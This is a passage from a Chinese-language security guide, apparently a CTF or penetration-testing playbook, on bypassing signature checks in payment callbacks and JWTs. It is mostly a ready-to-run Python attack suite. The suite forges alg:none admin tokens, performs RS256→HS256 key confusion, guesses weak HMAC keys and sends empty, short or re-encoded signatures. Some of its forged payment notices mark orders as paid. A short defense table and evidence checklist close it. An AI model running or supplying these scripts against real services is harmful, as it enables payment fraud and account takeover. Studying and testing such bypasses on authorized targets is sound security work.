```python
# empty_signature.py
def test_empty_signature(api_path: str, base_data: dict):
    """测试各种"空"签名"""
    empty_candidates = [
        ("", "empty string"),
        (" ", "whitespace"),
        ("\t", "tab"),
        ("\n", "newline"),
        ("  ", "two spaces"),
        ("\r\n", "CRLF"),
        ("null", "null string"),
        ("NULL", "NULL uppercase"),
        ("undefined", "undefined"),
        ("none", "none string"),
        ("-", "dash"),
        (".", "dot"),
        ("0", "zero char"),
        ("0x0", "hex zero"),
    ]

    for sign_str, desc in empty_candidates:
        body = dict(base_data, sign=sign_str)
        r = requests.post(BASE + api_path, json=body, timeout=10)
        status = r.status_code
        if status not in (400, 401, 403):
            print(f"[!] [{desc:20s}] sign={sign_str!r:15s} → {status} BYPASS!")
        else:
            print(f"[-] [{desc:20s}] sign={sign_str!r:15s} → {status}")
```

### 6.2 太短签名

```python
# too_short_signature.py
def test_short_signature(api_path: str, base_data: dict):
    """测试超短签名是否能通过"""
    for length in range(1, 9):
        short_sign = "A" * length
        body = dict(base_data, sign=short_sign)
        r = requests.post(BASE + api_path, json=body, timeout=10)
        if r.status_code == 200:
            print(f"[!] Sign length {length}: '{short_sign}' → {r.status_code} BYPASS!")
            return length
        else:
            print(f"[-] Sign length {length}: → {r.status_code}")
    return None
```

### 6.3 Hash 输出长度混淆

不同 hash 算法输出不同长度的 hex 字符串。如果服务器检查**签名长度**而非**算法强度**：

```python
# hash_length_confusion.py — Hash 长度混淆
def test_hash_length_confusion(notify_path: str, order_id: str):
    """利用不同 hash 算法的输出长度差异比较"""

    HASH_LENGTHS = {
        "MD4": 32,        # 128 bit → 32 hex
        "MD5": 32,        # 128 bit → 32 hex
        "SHA1": 40,       # 160 bit → 40 hex
        "SHA224": 56,     # 224 bit → 56 hex
        "SHA256": 64,     # 256 bit → 64 hex
        "SHA384": 96,     # 384 bit → 96 hex
        "SHA512": 128,    # 512 bit → 128 hex
        "SHA3-256": 64,   # 256 bit → 64 hex
        "BLAKE2b": 128,   # 512 bit → 128 hex
        "BLAKE2s": 64,    # 256 bit → 64 hex
        "SM3": 64,        # 256 bit → 64 hex (国密)
        "GOST": 64,       # 256 bit → 64 hex
        "RIPEMD160": 40,  # 160 bit → 40 hex
        "CRC32": 8,       # 32 bit → 8 hex
        "CRC64": 16,      # 64 bit → 16 hex
        "ADLER32": 8,     # 32 bit → 8 hex
    }

    base = {"out_trade_no": order_id, "trade_status": "TRADE_SUCCESS",
            "total_amount": "0.01"}

    for alg_name, expected_len in sorted(HASH_LENGTHS.items(), key=lambda x: x[1]):
        # 构造该长度的任意签名
        fake_sign = "0" * expected_len

        payloads = [
            dict(base, sign=fake_sign, sign_type=alg_name),
            dict(base, sign=fake_sign, algorithm=alg_name),
            dict(base, sign=fake_sign, hash_alg=alg_name),
        ]

        for body in payloads:
            r = requests.post(BASE + notify_path, json=body, timeout=10)
            if r.status_code == 200:
                print(f"[!] Length bypass! alg={alg_name} len={expected_len} → {r.status_code}")
                return alg_name, expected_len

    return None

# 场景:
# - 服务器只检查 len(sign) == 32 → 接受任意 32 hex 字符
# - 服务器写死 sign 字段 VARCHAR(32) → MD5 能通过但 SHA256 的 64 字符被截断
# - POST /update?sign=MD5:32chars → 如果服务器只取冒号后的 32 字符
```

## 7. 完整自动化脚本

`algorithm_attack_suite.py` — 全自动签名算法攻击器：

```python
#!/usr/bin/env python3
# algorithm_attack_suite.py — 签名算法攻击全自动套件
# 用法:
#   python algorithm_attack_suite.py --target https://target --path /api/notify
#   python algorithm_attack_suite.py --target https://target --path /api/order/create --jwt-mode

import argparse
import base64
import hashlib
import hmac
import json
import re
import sys
import time
from dataclasses import dataclass, field
from typing import Any, Callable
from urllib.parse import urlparse

import requests

# ============================================================
# Configuration
# ============================================================

# Algorithm field names (from Section 1.2)
ALG_FIELD_NAMES = [
    "sign_type", "sign_method", "algorithm", "alg", "alg_type",
    "hash_method", "hash_alg", "cipher", "encrypt_type", "encrypt_method",
    "security_type", "sign_type_alipay", "sign_type_wechat",
    "sign_type_stripe", "sign_type_paypal", "sign_method_xorpay",
    "sign_type_yungouos", "alg_jwt",
]

# Algorithm values — strong and weak
ALG_VALUES_WEAK = ["", "none", "NONE", "None", "MD5", "SHA1", "CRC32"]
ALG_VALUES_STRONG = ["SHA256", "SHA384", "SHA512", "HMAC-SHA256", "RSA2"]

SIGN_FIELD_NAMES = ["sign", "signature", "sig", "signStr", "sign_str",
                    "X-Signature", "x_sign", "sign_info", "token",
                    "X-Hub-Signature", "webhook_signature", "sign_data"]

# JWT-specific header variants
JWT_HEADER_VARIANTS = [
    {"alg": "none", "typ": "JWT"},
    {"alg": "None", "typ": "JWT"},
    {"alg": "NONE", "typ": "JWT"},
    {"alg": "", "typ": "JWT"},
    {"alg": None, "typ": "JWT"},
    {"alg": "none", "typ": "JWT", "kid": "../../../dev/null"},
    {"alg": ["none", "HS256"], "typ": "JWT"},
]

JWT_ADMIN_PAYLOAD = {"sub": "admin", "role": "admin", "iat": 9999999999, "exp": 9999999999}

# ============================================================
# Finding Types
# ============================================================

class Severity:
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

@dataclass
class Finding:
    test_name: str
    severity: str
    description: str
    request_body: dict
    response_status: int
    response_preview: str
    detail: str = ""

    def to_dict(self) -> dict:
        return {
            "test_name": self.test_name,
            "severity": self.severity,
            "description": self.description,
            "response_status": self.response_status,
            "response_preview": self.response_preview[:200],
            "detail": self.detail,
        }

# ============================================================
# Algorithm Attacker
# ============================================================

class AlgorithmAttacker:
    """
    全自动签名算法攻击器

    覆盖:
    1. 算法字段名枚举 + 弱算法值测试 (Section 1)
    2. "none" / 空算法测试 (Section 2)
    3. 算法混淆测试 (Section 3) — JWT RS256→HS256 + MD5/SHA1 HMAC 混淆
    4. 多算法回退攻击 (Section 4)
    5. 编码变体测试 (Section 5) — hex/base64/大小写/双重/截断
    6. 长度变体测试 (Section 6) — 空签名 / 超短签名 / hash 长度混淆
    """

    def __init__(self, target: str, path: str, session: requests.Session = None,
                 verbose: bool = True, rate_limit_ms: int = 50):
        self.base_url = target.rstrip("/")
        self.path = path
        self.full_url = self.base_url + path
        self.s = session or requests.Session()
        self.verbose = verbose
        self.rate_limit = rate_limit_ms / 1000.0
        self.findings: list[Finding] = []
        self.base_data: dict = {}
        self.jwt_mode: bool = False
        self.jwks_url: str | None = None
        self.public_key: bytes | None = None

    # ---- Helpers ----

    def _log(self, msg: str):
        if self.verbose:
            print(msg, flush=True)

    def _throttle(self):
        time.sleep(self.rate_limit)

    def _make_sign(self, data: dict, algorithm: str, key: str = "") -> str:
        """对 data 按 algorithm 生成签名"""
        raw = json.dumps(data, sort_keys=True, separators=(',', ':'))

        if algorithm.lower() in ("", "none", "null"):
            return ""
        elif algorithm.upper() == "MD5":
            return hashlib.md5((raw + key).encode()).hexdigest()
        elif algorithm.upper() in ("HMAC-MD5", "HmacMD5"):
            return hmac.new(key.encode(), raw.encode(), "md5").hexdigest()
        elif algorithm.upper() == "SHA1":
            return hashlib.sha1((raw + key).encode()).hexdigest()
        elif algorithm.upper() in ("HMAC-SHA1", "HmacSHA1"):
            return hmac.new(key.encode(), raw.encode(), "sha1").hexdigest()
        elif algorithm.upper() in ("SHA256", "HMAC-SHA256", "HmacSHA256"):
            return hashlib.sha256((raw + key).encode()).hexdigest()
        else:
            return "x" * 32

    def _post(self, body: dict) -> requests.Response:
        """发送 POST 请求（支持 JSON bodies 和 headers）"""
        headers = {"Content-Type": "application/json"}
        try:
            r = self.s.post(self.full_url, json=body, headers=headers, timeout=15)
            return r
        except requests.RequestException as e:
            self._log(f"  Request error: {e}")
            return requests.Response()  # empty

    def _check_bypass(self, r: requests.Response) -> bool:
        """判断是否绕过签名验证"""
        # 200 OK + 不含 fail/error/invalid/forbidden
        if r.status_code not in (200, 201, 202, 204, 302):
            return False
        lower_text = r.text.lower()
        negative_keywords = ["fail", "error", "invalid", "forbidden", "unauthorized",
                             "bad", "denied", "rejected", "wrong", "incorrect"]
        if any(kw in lower_text for kw in negative_keywords):
            # 如果 body 包含业务数据而非错误，仍视为绕过
            if "order_id" in r.text or "success" in lower_text:
                return True
            return False
        return True

    def _record(self, test_name: str, severity: str, description: str,
                body: dict, r: requests.Response, detail: str = ""):
        f = Finding(
            test_name=test_name,
            severity=severity,
            description=description,
            request_body=body,
            response_status=r.status_code if hasattr(r, 'status_code') else 0,
            response_preview=r.text[:300] if hasattr(r, 'text') else "",
            detail=detail,
        )
        self.findings.append(f)
        icon = {"CRITICAL": "[!!!]", "HIGH": "[!!]", "MEDIUM": "[!]", "LOW": "[*]", "INFO": "[+]"}
        self._log(f"  {icon.get(severity, '[?]')} [{severity}] {test_name}: {description}")
        if self.verbose and hasattr(r, 'status_code'):
            self._log(f"      HTTP {r.status_code} | {r.text[:150]}")

    # ---- 1. Algorithm Field & Value Enumeration ----

    def run_algorithm_downgrade(self):
        """Section 1: 枚举算法字段 + 弱算法值"""
        self._log(f"\n{'='*60}")
        self._log("1. Algorithm Downgrade — 算法降级测试")
        self._log(f"{'='*60}")

        # 空/无算法测试
        for field in ALG_FIELD_NAMES:
            for alg_val in ALG_VALUES_WEAK:
                body = dict(self.base_data)
                body[field] = alg_val
                body["sign"] = "" if alg_val in ("", "none", "NONE", None) else self._make_sign(body, alg_val)
                r = self._post(body)
                self._throttle()

                if self._check_bypass(r):
                    self._record(
                        f"alg_downgrade_{field}_{alg_val}",
                        Severity.HIGH if alg_val in ("", "none") else Severity.MEDIUM,
                        f"Algorithm downgrade: {field}={alg_val}",
                        body, r,
                        detail=f"Server accepted weak algorithm {alg_val}"
                    )

    # ---- 2. "None" Algorithm ----

    def run_none_algorithm(self):
        """Section 2: None 算法 / 空签名测试"""
        self._log(f"\n{'='*60}")
        self._log("2. None Algorithm — 'None' 算法 / 空签名测试")
        self._log(f"{'='*60}")

        if self.jwt_mode:
            # JWT alg:none
            self._log("  [JWT mode] Testing alg:none variants...")
            for i, hdr in enumerate(JWT_HEADER_VARIANTS):
                h_b64 = base64.urlsafe_b64encode(
                    json.dumps(hdr, separators=(',', ':')).encode()
                ).rstrip(b'=').decode()
                p_b64 = base64.urlsafe_b64encode(
                    json.dumps(JWT_ADMIN_PAYLOAD, separators=(',', ':')).encode()
                ).rstrip(b'=').decode()
                token = f"{h_b64}.{p_b64}."
                r = self.s.get(self.full_url,
                               headers={"Authorization": f"Bearer {token}"},
                               timeout=15)
                self._throttle()
                if r.status_code not in (401, 403):
                    sev = Severity.CRITICAL if hdr.get("alg") in ("none", "", None) else Severity.HIGH
                    self._record(
                        f"jwt_none_variant_{i}",
                        sev,
                        f"JWT alg:none bypass with header={hdr}",
                        {"token": token[:60] + "..."}, r,
                        detail=f"alg={hdr.get('alg')}"
                    )
        else:
            # 通用 none 测试
            for sf in SIGN_FIELD_NAMES[:5]:  # limit to 5 most common
                for val, label in [("", "empty"), ("none", "string_none"),
                                   ("null", "string_null"), ("0", "zero"),
                                   ("undefined", "undefined"), ("NONE", "NONE")]:
                    body = dict(self.base_data)
                    body[sf] = val
                    r = self._post(body)
                    self._throttle()
                    if self._check_bypass(r):
                        self._record(
                            f"none_{sf}_{label}",
                            Severity.HIGH,
                            f"'{label}' value in {sf} accepted",
                            body, r
                        )

    # ---- 3. Algorithm Confusion ----

    def run_algorithm_confusion(self, jwks_url: str = None):
        """Section 3: 算法混淆测试"""
        self._log(f"\n{'='*60}")
        self._log("3. Algorithm Confusion — 算法混淆测试")
        self._log(f"{'='*60}")

        # 3a. JWT RS256 → HS256
        if self.jwt_mode:
            self._log("  [JWT mode] RS256→HS256 confusion...")
            pub_key = self._discover_jwt_public_key(jwks_url)
            if pub_key:
                for alg in ["HS256", "HS384", "HS512"]:
                    hash_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                               "HS512": hashlib.sha512}[alg]
                    header = {"alg": alg, "typ": "JWT"}
                    h_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).rstrip(b'=').decode()
                    p_b64 = base64.urlsafe_b64encode(json.dumps(JWT_ADMIN_PAYLOAD, separators=(',', ':')).encode()).rstrip(b'=').decode()
                    msg = f"{h_b64}.{p_b64}".encode()
                    sig = hmac.new(pub_key, msg, hash_fn).digest()
                    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
                    token = f"{h_b64}.{p_b64}.{sig_b64}"
                    r = self.s.get(self.full_url,
                                   headers={"Authorization": f"Bearer {token}"},
                                   timeout=15)
                    self._throttle()
                    if r.status_code == 200:
                        self._record(
                            f"jwt_confusion_{alg}",
                            Severity.CRITICAL,
                            f"JWT algorithm confusion {alg} with public key as HMAC secret",
                            {}, r,
                            detail="RS256 public key used as HMAC key"
                        )
            else:
                self._log("  [-] No public key found, skipping RS256→HS256")
        else:
            # 3b. MD5 vs HMAC-MD5 混淆
            self._log("  Testing MD5 vs HMAC-MD5 confusion...")
            for key_try in ["", "test", "secret", "key"]:
                raw = json.dumps(self.base_data, sort_keys=True)
                md5_sig = hashlib.md5((raw + key_try).encode()).hexdigest()
                hmac_md5_sig = hmac.new(key_try.encode(), raw.encode(), "md5").hexdigest()
                for body in [
                    dict(self.base_data, sign_type="HmacMD5", sign=md5_sig),
                    dict(self.base_data, sign_type="MD5", sign=hmac_md5_sig),
                    dict(self.base_data, sign_type="HmacSHA1",
                         sign=hashlib.sha1((raw + key_try).encode()).hexdigest()),
                ]:
                    r = self._post(body)
                    self._throttle()
                    if self._check_bypass(r):
                        self._record(
                            f"hmac_confusion_key_{key_try}",
                            Severity.HIGH,
                            f"HMAC vs plain hash confusion with key='{key_try}'",
                            body, r
                        )

    def _discover_jwt_public_key(self, jwks_url: str = None) -> bytes | None:
        """发现 JWT 公钥"""
        if self.public_key:
            return self.public_key

        endpoints = [jwks_url] if jwks_url else [
            "/.well-known/jwks.json", "/.well-known/openid-configuration",
            "/jwks.json", "/api/jwks", "/openid/connect/jwks",
            "/public.key", "/cert.pem",
        ]

        for ep in endpoints:
            if not ep:
                continue
            try:
                r = self.s.get(self.base_url + ep, timeout=15)
                if r.status_code != 200:
                    continue
                data = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}

                if "keys" in data:
                    for key in data["keys"]:
                        if "n" in key:
                            pad = 4 - len(key["n"]) % 4
                            n_bytes = base64.urlsafe_b64decode(key["n"] + ("=" * pad if pad else ""))
                            self.public_key = n_bytes
                            self._log(f"  [+] Public key found from {ep}")
                            return n_bytes

                if "jwks_uri" in data:
                    return self._discover_jwt_public_key(data["jwks_uri"])

                if b"-----BEGIN PUBLIC KEY-----" in r.content:
                    from cryptography.hazmat.primitives import serialization
                    from cryptography.hazmat.backends import default_backend
                    pub = serialization.load_pem_public_key(r.content, backend=default_backend())
                    nums = pub.public_numbers()
                    n_bytes = nums.n.to_bytes((nums.n.bit_length() + 7) // 8, 'big')
                    self.public_key = n_bytes
                    return n_bytes
            except Exception as e:
                self._log(f"  [-] Error fetching {ep}: {e}")
                continue
        return None

    # ---- 4. Multi-Algorithm Fallback ----

    def run_multi_algorithm_fallback(self):
        """Section 4: 多算法回退攻击"""
        self._log(f"\n{'='*60}")
        self._log("4. Multi-Algorithm Fallback — 多算法回退攻击")
        self._log(f"{'='*60}")

        raw = json.dumps(self.base_data, sort_keys=True)
        weak_keys = ["", "test", "123456", "key", "secret", "password", "debug"]

        for key in weak_keys:
            # 生成 MD5 签名 (弱)
            md5_sig = hashlib.md5((raw + key).encode()).hexdigest()

            # 同时注入多个 sign 字段
            body = dict(self.base_data)
            body["sign_type"] = "MD5"
            body["sign"] = md5_sig
            body["sign_type_sha256"] = "SHA256"
            body["sign_sha256"] = "x" * 64  # 错误签名
            body["X-Original-Algorithm"] = "SHA256"

            r = self._post(body)
            self._throttle()
            if self._check_bypass(r):
                self._record(
                    f"fallback_md5_key_{key}",
                    Severity.HIGH,
                    f"Multi-algorithm fallback: accepted MD5 with key='{key}'",
                    body, r
                )

        # 测试签名栈——算法字段存在于不同层
        self._log("  Testing signature stack fallback...")
        stack_cases = [
            ({"alg": "none", "sign_type": "SHA256", "sign": ""}, "header_none_body_sha256"),
            ({"alg": "SHA256", "sign_type": "MD5", "sign": "x" * 32}, "header_sha256_body_md5"),
            ({"sign_type": "", "sign": ""}, "empty_sign_type"),
            ({"algorithm": "none", "sign_type": "SHA256"}, "algorithm_none"),
        ]
        for body_items, case_name in stack_cases:
            body = dict(self.base_data, **body_items)
            r = self._post(body)
            self._throttle()
            if self._check_bypass(r):
                self._record(
                    f"stack_fallback_{case_name}",
                    Severity.HIGH,
                    f"Algorithm stack fallback: {case_name}",
                    body, r
                )

    # ---- 5. Encoding Variants ----

    def run_encoding_attacks(self):
        """Section 5: 编码攻击"""
        self._log(f"\n{'='*60}")
        self._log("5. Encoding Attacks — 签名编码攻击")
        self._log(f"{'='*60}")

        raw = json.dumps(self.base_data, sort_keys=True)
        md5_bytes = hashlib.md5(raw.encode()).digest()
        md5_hex = md5_bytes.hex()

        # 5a. Hex 大小写
        self._log("  Testing hex case sensitivity...")
        for sign_val, label in [
            (md5_hex, "lowercase"),
            (md5_hex.upper(), "uppercase"),
            (md5_hex[:16].upper() + md5_hex[16:], "mixed_case"),
            (md5_hex.swapcase(), "swapcase"),
        ]:
            body = dict(self.base_data, sign=sign_val, sign_type="MD5")
            r = self._post(body)
            self._throttle()
            if self._check_bypass(r):
                self._record(
                    f"encoding_case_{label}",
                    Severity.LOW,
                    f"Case-insensitive signature comparison ({label})",
                    body, r
                )

        # 5b. Base64 vs Hex
        self._log("  Testing base64 vs hex...")
        md5_b64 = base64.b64encode(md5_bytes).decode()
        md5_b64url = base64.urlsafe_b64encode(md5_bytes).decode().rstrip("=")

        for sign_val, label in [
            (md5_b64, "base64"),
            (md5_b64url, "base64url"),
            (md5_b64[::-1], "base64_reversed"),
            (md5_b64.replace("+", "-").replace("/", "_"), "base64_to_b64url"),
        ]:
            body = dict(self.base_data, sign=sign_val)
            r = self._post(body)
            self._throttle()
            if self._check_bypass(r):
                self._record(
                    f"encoding_{label}",
                    Severity.MEDIUM,
                    f"Alternative encoding accepted: {label}",
                    body, r
                )

        # 5c. 双重编码
        self._log("  Testing double encoding...")
        # base64(hex(md5(data)))
        double_b64_then_b64 = base64.b64encode(md5_hex.encode()).decode()
        double_b64_then_b64url = base64.urlsafe_b64encode(md5_hex.encode()).decode().rstrip("=")
        for sign_val, label in [
            (double_b64_then_b64, "b64_of_hex"),
            (double_b64_then_b64url, "b64url_of_hex"),
            (md5_hex.encode().hex(), "hex_of_hex"),
        ]:
            body = dict(self.base_data, sign=sign_val)
            r = self._post(body)
            self._throttle()
            if self._check_bypass(r):
                self._record(
                    f"double_encoding_{label}",
                    Severity.MEDIUM,
                    f"Double encoding accepted: {label}",
                    body, r
                )

    # ---- 6. Length Attacks ----

    def run_length_attacks(self):
        """Section 6: 签名长度攻击"""
        self._log(f"\n{'='*60}")
        self._log("6. Length Attacks — 签名长度攻击")
        self._log(f"{'='*60}")

        # 6a. 空签名
        self._log("  Testing empty signatures...")
        for empty_val, label in [
            ("", "empty"), (" ", "space"), ("\t", "tab"), ("\n", "newline"),
            ("null", "null_str"), ("0", "zero"),
        ]:
            body = dict(self.base_data, sign=empty_val)
            r = self._post(body)
            self._throttle()
            if self._check_bypass(r):
                self._record(
                    f"length_empty_{label}",
                    Severity.CRITICAL,
                    f"Empty/blank signature accepted: {label!r}",
                    body, r,
                    detail="Server skips signature verification when sign is empty"
                )

        # 6b. 超短签名
        self._log("  Testing too-short signatures...")
        for length in range(1, 17):
            short_sign = "A" * length
            body = dict(self.base_data, sign=short_sign, sign_type="MD5")
            r = self._post(body)
            self._throttle()
            if self._check_bypass(r):
                self._record(
                    f"length_too_short_{length}",
                    Severity.HIGH,
                    f"Signature of only {length} chars accepted (expected 32 for MD5)",
                    body, r,
                    detail=f"Truncated signature match: {length}/{32} chars"
                )
                break  # 找到最低长度

        # 6c. Hash 长度混淆
        self._log("  Testing hash length confusion...")
        hash_lengths = {
            "MD5": 32, "SHA1": 40, "SHA256": 64,
            "SHA384": 96, "SHA512": 128, "CRC32": 8,
            "CRC64": 16, "SM3": 64, "BLAKE2b": 128,
        }
        for alg, length in hash_lengths.items():
            fake_sign = "F" * length
            body = dict(self.base_data, sign=fake_sign, sign_type=alg)
            r = self._post(body)
            self._throttle()
            if self._check_bypass(r):
                self._record(
                    f"length_hash_confusion_{alg}",
                    Severity.MEDIUM,
                    f"Hash length confusion: {alg} (expected {length} hex chars)",
                    body, r,
                    detail="Server only checks signature length, not algorithm"
                )

    # ---- 7. JWT Public Key Discovery ----

    def run_jwt_public_key_discovery(self):
        """单独的 JWT 公钥发现"""
        self._log(f"\n{'='*60}")
        self._log("7. JWT Public Key Discovery")
        self._log(f"{'='*60}")

        endpoints = [
            "/.well-known/jwks.json",
            "/.well-known/openid-configuration",
            "/jwks.json",
            "/api/jwks",
            "/openid/connect/jwks",
            "/.well-known/oauth-authorization-server",
            "/oauth2/keys",
            "/public.key",
            "/cert.pem",
            "/api/public-key",
            "/static/jwks.json",
        ]

        for ep in endpoints:
            try:
                r = self.s.get(self.base_url + ep, timeout=15)
                if r.status_code == 200:
                    self._log(f"  [+] {ep} → 200 (accessible)")
                    self._record(
                        f"jwks_discovery_{ep.strip('/').replace('/', '_')}",
                        Severity.INFO,
                        f"JWKS endpoint accessible: {ep}",
                        {}, r,
                        detail=r.text[:500]
                    )
                else:
                    self._log(f"  [-] {ep} → {r.status_code}")
            except Exception:
                pass

    # ---- Run All ----

    def run_all(self, jwt_mode: bool = False, jwks_url: str = None):
        """运行全部 6+1 项测试"""
        self.jwt_mode = jwt_mode
        if self.base_data == {}:
            self.base_data = {"order_id": "TEST_ORDER", "amount": "0.01"}

        self._log(f"AlgorithmAttacker targeting: {self.full_url}")
        self._log(f"JWT mode: {jwt_mode}")
        self._log(f"Base data: {json.dumps(self.base_data, indent=2)}")
        self._log("=" * 60)

        self.run_algorithm_downgrade()
        self.run_none_algorithm()
        self.run_algorithm_confusion(jwks_url)
        self.run_multi_algorithm_fallback()
        self.run_encoding_attacks()
        self.run_length_attacks()
        self.run_jwt_public_key_discovery()

        self._print_summary()
        return self.findings

    def _print_summary(self):
        """输出总结报告"""
        self._log(f"\n{'='*60}")
        self._log("SUMMARY")
        self._log(f"{'='*60}")
        self._log(f"Total findings: {len(self.findings)}")

        if not self.findings:
            self._log("No vulnerabilities found — signature verification is secure.")
            return

        for severity in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]:
            items = [f for f in self.findings if f.severity == severity]
            if items:
                self._log(f"\n  [{severity}] — {len(items)} findings:")
                for f in items:
                    self._log(f"    - {f.test_name}: {f.description}")

    def export_json(self, output_path: str = None) -> str:
        """导出为 JSON 报告"""
        report = {
            "target": self.full_url,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "total_findings": len(self.findings),
            "findings": [f.to_dict() for f in self.findings],
        }
        report_json = json.dumps(report, indent=2, ensure_ascii=False)
        if output_path:
            with open(output_path, "w", encoding="utf-8") as f:
                f.write(report_json)
            self._log(f"\nReport exported to: {output_path}")
        return report_json

    def export_markdown(self, output_path: str = None) -> str:
        """导出为 Markdown 报告"""
        md = f"# Algorithm Attack Report\n\n"
        md += f"**Target**: `{self.full_url}`\n"
        md += f"**Time**: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}\n"
        md += f"**Total Findings**: {len(self.findings)}\n\n"

        for severity in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]:
            items = [f for f in self.findings if f.severity == severity]
            if not items:
                continue
            md += f"## {severity}\n\n"
            for f in items:
                md += f"### {f.test_name}\n"
                md += f"- **Description**: {f.description}\n"
                md += f"- **HTTP Status**: {f.response_status}\n"
                md += f"- **Request Body**: `{json.dumps(f.request_body, ensure_ascii=False)[:200]}`\n"
                md += f"- **Response**: `{f.response_preview[:200]}`\n"
                if f.detail:
                    md += f"- **Detail**: {f.detail}\n"
                md += "\n"

        if output_path:
            with open(output_path, "w", encoding="utf-8") as f:
                f.write(md)
            self._log(f"Markdown report exported to: {output_path}")
        return md


# ============================================================
# CLI Entry Point
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="Algorithm Attack Suite — 签名算法攻击全自动套件",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # 标准 API 签名测试
  python algorithm_attack_suite.py --target https://api.target.com --path /api/payment/notify

  # JWT 模式 (自动检测 alg:none + RS256→HS256 混淆)
  python algorithm_attack_suite.py --target https://api.target.com --path /api/admin --jwt

  # 自定义基础数据
  python algorithm_attack_suite.py --target https://target --path /notify \\
    --data '{"order_id": "TEST", "amount": "0.01", "status": "success"}'

  # 导出报告
  python algorithm_attack_suite.py --target https://target --path /api/notify \\
    --report findings.json

  # JWT 模式 + 指定 JWKS URL
  python algorithm_attack_suite.py --target https://target --path /api/admin --jwt \\
    --jwks https://target/.well-known/jwks.json
        """
    )
    parser.add_argument("--target", required=True, help="Base URL (e.g., https://target)")
    parser.add_argument("--path", default="/api/notify", help="API path (default: /api/notify)")
    parser.add_argument("--jwt", action="store_true", help="Enable JWT-specific tests (alg:none, RS256→HS256)")
    parser.add_argument("--jwks", help="JWKS URL (optional, auto-discovered if omitted)")
    parser.add_argument("--data", default='{"order_id": "TEST_ORDER", "amount": "0.01"}',
                        help='Base JSON data as string')
    parser.add_argument("--report", help="Output JSON report file path")
    parser.add_argument("--markdown", help="Output Markdown report file path")
    parser.add_argument("--quiet", action="store_true", help="Suppress verbose output")
    parser.add_argument("--rate-limit", type=int, default=50, help="Rate limit in ms between requests")

    args = parser.parse_args()

    # 验证 URL
    parsed = urlparse(args.target)
    if not parsed.scheme or not parsed.netloc:
        print(f"Error: invalid target URL: {args.target}")
        sys.exit(1)

    # 解析 base_data
    try:
        base_data = json.loads(args.data)
    except json.JSONDecodeError as e:
        print(f"Error: invalid JSON data: {e}")
        sys.exit(1)

    # 创建攻击器
    attacker = AlgorithmAttacker(
        target=args.target,
        path=args.path,
        verbose=not args.quiet,
        rate_limit_ms=args.rate_limit,
    )
    attacker.base_data = base_data

    # 运行全部测试
    findings = attacker.run_all(jwt_mode=args.jwt, jwks_url=args.jwks)

    # 导出
    if args.report:
        attacker.export_json(args.report)
    if args.markdown:
        attacker.export_markdown(args.markdown)
    if not args.report and not args.markdown:
        # 默认输出 JSON 到 stdout
        print(f"\n{attacker.export_json()}")

    # 返回值
    critical_count = len([f for f in findings if f.severity == Severity.CRITICAL])
    high_count = len([f for f in findings if f.severity == Severity.HIGH])
    sys.exit(0 if critical_count == 0 else 2)


if __name__ == "__main__":
    main()

```

## 攻击链

```mermaid
graph TD
    subgraph "Algorithm Downgrade"
        ALG_FIELDS["算法字段枚举<br/>sign_type/sign_method/algorithm/alg"] --> WEAK_VALUES["弱算法值<br/>''/none/MD5/SHA1/CRC32"]
        WEAK_VALUES --> ALG_BYPASS["算法降级绕过"]
    end

    subgraph "None Algorithm"
        JWT_NONE["JWT alg:none"] --> SKIP_VERIFY["跳过验证"]
        GEN_NONE["通用 none/null/empty"] --> SKIP_VERIFY
    end

    subgraph "Algorithm Confusion"
        RS_HS["RS256→HS256<br/>公钥做HMAC密钥"] --> CONFUSE_VERIFY["算法角色混淆"]
        MD5_HMAC["MD5 vs HMAC-MD5"] --> CONFUSE_VERIFY
        SHA1_HMAC["SHA1 vs HMAC-SHA1"] --> CONFUSE_VERIFY
    end

    subgraph "Fallback / Stack"
        MULTI_ALG["多算法遍历取第一个成功"] --> FALL_BYPASS["遍历到弱算法"]
        STACK_ALG["Header→Body→Config 回退"] --> FALL_BYPASS
    end

    subgraph "Encoding / Length"
        HEX_B64["Hex vs Base64 混淆"] --> ENC_BYPASS["编码绕过"]
        DOUBLE_ENC["双重编码<br/>b64(hex(MD5))"] --> ENC_BYPASS
        CASE_SENS["大小写不敏感"] --> ENC_BYPASS
        TRUNC_SIG["截断匹配<br/>仅前 N 字符"] --> TRUNC_BYPASS["长度绕过"]
        EMPTY_SIG["空签名"] --> TRUNC_BYPASS
        SHORT_SIG["超短签名"] --> TRUNC_BYPASS
        LEN_CONFUSE["Hash 长度混淆<br/>SHA256 64字 vs MD5 32字"] --> TRUNC_BYPASS
    end

    ALG_BYPASS --> FLAG["🏴 Flag"]
    SKIP_VERIFY --> FLAG
    CONFUSE_VERIFY --> FLAG
    FALL_BYPASS --> FLAG
    ENC_BYPASS --> FLAG
    TRUNC_BYPASS --> FLAG
```



## 防御清单

| 攻击类型 | 防御措施 |
|---------|---------|
| 算法降级 | 服务端固定白名单算法，拒绝客户端指定；`ALLOWED_ALGORITHMS = ["HMAC-SHA256", "RSA2"]` |
| None 算法 | 检查算法字段值，拒绝 none/null/空字符串；对每个算法做实际验签 |
| 算法混淆 | 公钥只用于 RS256/ES256 验证，禁止做 HMAC 密钥；不同算法使用不同 key 对象 |
| 多算法回退 | 只使用单一算法，不遍历；或限制验证链长度为 1 |
| 编码混淆 | 签名值严格规范化（hex lowercase）；拒绝非标准编码 |
| 长度漏洞 | 签名长度固定且与算法匹配；拒绝空/超短签名 |
| 双重编码 | 解码一次后重算签名对比，不信任客户端提供的 encoding |
| 大小写 | 签名比较前标准化为 hex lowercase |

## Evidence 交付标准

签名算法漏洞确认必须提供：

1. **baseline**: 正常请求使用的算法、key、签名值
2. **payload**: 篡改后的算法字段 + 签名值（完整 body 或 JWT）
3. **response**: 服务端 200 OK + 业务数据（订单状态、权益变化）
4. **algorithm_diff**: 服务端接受的算法 vs 预期算法
